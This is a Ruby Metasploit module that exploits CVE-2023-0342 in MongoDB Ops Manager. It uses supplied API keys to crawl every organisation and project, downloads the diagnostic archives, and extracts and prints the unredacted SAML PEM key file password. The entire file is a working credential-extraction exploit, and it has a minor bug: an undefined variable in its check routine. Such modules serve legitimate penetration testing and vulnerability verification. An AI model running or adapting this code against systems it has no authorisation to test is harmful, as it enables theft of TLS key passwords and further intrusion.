##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'digest/md5'
require 'zlib'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MongoDB Ops Manager Diagnostic Archive Sensitive Information Retriever',
        'Description' => %q{
          MongoDB Ops Manager Diagnostics Archive does not redact SAML SSL Pem Key File Password
          field (mms.saml.ssl.PEMKeyFilePassword) within app settings. Archives do not include
          the PEM files themselves. This module extracts that unredacted password and stores
          the diagnostic archive for additional manual review.

          This issue affects MongoDB Ops Manager v5.0 prior to 5.0.21 and
          MongoDB Ops Manager v6.0 prior to 6.0.12.

          API credentials with the role of GLOBAL_MONITORING_ADMIN or GLOBAL_OWNER are required.

          Successfully tested against MongoDB Ops Manager v6.0.11.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
        ],
        'References' => [
          [ 'URL', 'https://github.com/advisories/GHSA-xqvf-v5jg-pxc2'],
          [ 'URL', 'https://www.mongodb.com/docs/ops-manager/current/reference/configuration/#mongodb-setting-mms.https.PEMKeyFilePassword'],
          [ 'CVE', '2023-0342']
        ],
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DisclosureDate' => '2023-06-09',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )
    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('API_PUBKEY', [ true, 'Public Key to login with for API requests', '']),
        OptString.new('API_PRIVKEY', [ true, 'Password to login with for API requests', '']),
        OptString.new('TARGETURI', [ true, 'The URI of MongoDB Ops Manager', '/'])
      ]
    )
  end

  def check
    url = normalize_uri(target_uri.path, 'api', 'public', 'v1.0')
    auth_response = digest_auth(url)
    # https://www.mongodb.com/docs/ops-manager/current/tutorial/update-om-with-latest-version-manifest-with-api/
    res = send_request_cgi(
      'uri' => url,
      'headers' => {
        'accept' => 'application/json',
        'authorization' => auth_response
      }
    )

    return Exploit::CheckCode::Unknown("#{peer} - Could not connect to web service - no response") if res.nil?
    return Exploit::CheckCode::Unknown("#{peer} - Check URI Path, unexpected HTTP response code: #{res.code}") unless res.code == 200

    roles = res.get_json_document.dig('apiKey', 'roles')
    return Exploit::CheckCode::Unknown("#{peer} - Unable to retrieve roles") if roles.nil?

    roles = roles.map { |hash| hash['roleName'] }
    return Exploit::CheckCode::Safe("API key requires GLOBAL_MONITORING_ADMIN or GLOBAL_OWNER permissions. Current permissions: #{permission.join(', ')}") unless roles.include?('GLOBAL_MONITORING_ADMIN') || roles.include?('GLOBAL_OWNER')

    Exploit::CheckCode::Detected('API key has correct roles but version detection not possible')
  end

  def username
    datastore['API_PUBKEY']
  end

  def password
    datastore['API_PRIVKEY']
  end

  def digest_auth(url)
    # get a 401 so we get the WWW-Authenticate header
    res = send_request_cgi(
      'uri' => url,
      'headers' => {
        'accept' => 'application/json'
      }
    )
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Basic auth not enabled, but is expected") unless res.code == 401

    # Define the regular expression pattern to capture key-value pairs
    pattern = /(\w+)="(.*?)"/

    parsed_hash = {}
    res.headers['WWW-Authenticate'].scan(pattern) do |key, value|
      parsed_hash[key] = value
    end

    parsed_hash['nc'] = '00000001'
    parsed_hash['cnonce'] = '0a4f113b' # XXX randomize?

    # Calculate the response
    ha1 = Digest::MD5.hexdigest("#{username}:#{parsed_hash['realm']}:#{password}")
    ha2 = Digest::MD5.hexdigest("GET:#{url}")
    parsed_hash['response'] = Digest::MD5.hexdigest("#{ha1}:#{parsed_hash['nonce']}:#{parsed_hash['nc']}:#{parsed_hash['cnonce']}:#{parsed_hash['qop']}:#{ha2}")

    %(Digest username="#{username}", realm="#{parsed_hash['realm']}", nonce="#{parsed_hash['nonce']}", uri="#{url}", cnonce="#{parsed_hash['cnonce']}", nc=#{parsed_hash['nc']}, qop=auth, response="#{parsed_hash['response']}", algorithm=MD5)
  end

  def get_orgs
    url = normalize_uri(target_uri.path, 'api', 'public', 'v1.0', 'orgs')
    auth_response = digest_auth(url)
    # https://www.mongodb.com/docs/ops-manager/v6.0/reference/api/organizations/organization-get-all/
    res = send_request_cgi(
      'uri' => url,
      'headers' => {
        'accept' => 'application/json',
        'authorization' => auth_response
      }
    )
    fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
    fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials or not enough permissions (response code: #{res.code})") if res.code == 401
    res.get_json_document
  end

  def get_projects(org)
    url = normalize_uri(target_uri.path, 'api', 'public', 'v1.0', 'orgs', org, 'groups')
    auth_response = digest_auth(url)
    # https://www.mongodb.com/docs/ops-manager/current/reference/api/organizations/organization-get-all-projects/
    res = send_request_cgi(
      'uri' => url,
      'ctype' => 'application/json',
      'headers' => {
        'accept' => 'application/json',
        'authorization' => auth_response
      }
    )
    return [] if res.nil? || res.code == 401

    res.get_json_document['results']
  end

  def get_diagnostic_archive(project)
    url = normalize_uri(target_uri.path, 'api', 'public', 'v1.0', 'groups', project, 'diagnostics')
    auth_response = digest_auth(url)
    # https://www.mongodb.com/docs/ops-manager/current/reference/api/diagnostics/get-project-diagnostic-archive/
    res = send_request_cgi(
      'uri' => url,
      'ctype' => 'application/json',
      'headers' => {
        'accept' => 'application/gzip',
        'authorization' => auth_response
      },
      'vars_get' => { 'pretty' => 'true' }
    )
    return unless res&.code == 200

    loot_location = store_loot('mongodb.ops_manager.project_diagnostics', 'application/gzip', rhost, res.body, "project_diagnostics.#{project}.tar.gz", "Project diagnostics for MongoDB Project #{project}")
    print_good("Stored Project Diagnostics files to #{loot_location}")
    vprint_status('    Opening project_diagnostics.tar.gz')
    gz_reader = Zlib::GzipReader.new(StringIO.new(res.body))
    tar_reader = Rex::Tar::Reader.new(gz_reader)
    tar_reader.each do |entry|
      next unless entry.full_name == 'global/appSettings.json'

      json_data = JSON.parse(entry.read)
      next unless json_data.key? 'instanceOverrides'

      json_data['instanceOverrides'].each do |key, value|
        next unless value.key? 'mms.saml.ssl.PEMKeyFilePassword'

        if value['mms.saml.ssl.PEMKeyFilePassword'] == '<redacted>'
          fail_with(Failure::NotVulnerable, 'Value is <redacted>, server is patched.')
        else
          print_good("Found #{key}'s unredacted mms.saml.ssl.PEMKeyFilePassword: #{value['mms.saml.ssl.PEMKeyFilePassword']}")
        end
      end
    end
    tar_reader.close
    gz_reader.close
  end

  def run
    vprint_status('Checking for orgs')
    orgs = get_orgs
    orgs['results'].each do |org|
      org = org['id']
      vprint_status("Looking for projects in org #{org}")
      projects = get_projects(org)
      projects.each do |project|
        vprint_good("  Found project: #{project['name']} (#{project['id']})")
        get_diagnostic_archive(project['id'])
      end
    end
  end
end
